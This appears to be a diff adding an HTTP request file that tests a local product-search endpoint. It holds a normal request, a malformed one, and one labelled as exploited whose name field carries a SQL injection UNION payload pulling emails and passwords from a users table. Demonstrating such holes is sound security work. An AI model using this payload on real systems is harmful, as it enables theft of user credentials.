@@ -1,0 +1,27 @@
+### POST Expected Request
+GET http://localhost:8000/api/get-product-by-name
+Content-Type: application/json
+Accept: application/json
+
+{
+    "name": "crypt"
+}
+
+### POST Malformed Request
+GET http://localhost:8000/api/get-product-by-name
+Content-Type: application/json
+Accept: application/json
+
+{
+    "name": "crypt'; &&"
+}
+
+### POST Exploited Request (1)
+GET http://localhost:8000/api/get-product-by-name
+Content-Type: application/json
+Accept: application/json
+
+{
+    "name": "aaaaaaaaaa%' UNION SELECT 0 as id, CONCAT(id, '~', name, '~', email, '~', password) as name FROM users LIMIT 1; -- a"
+}
+
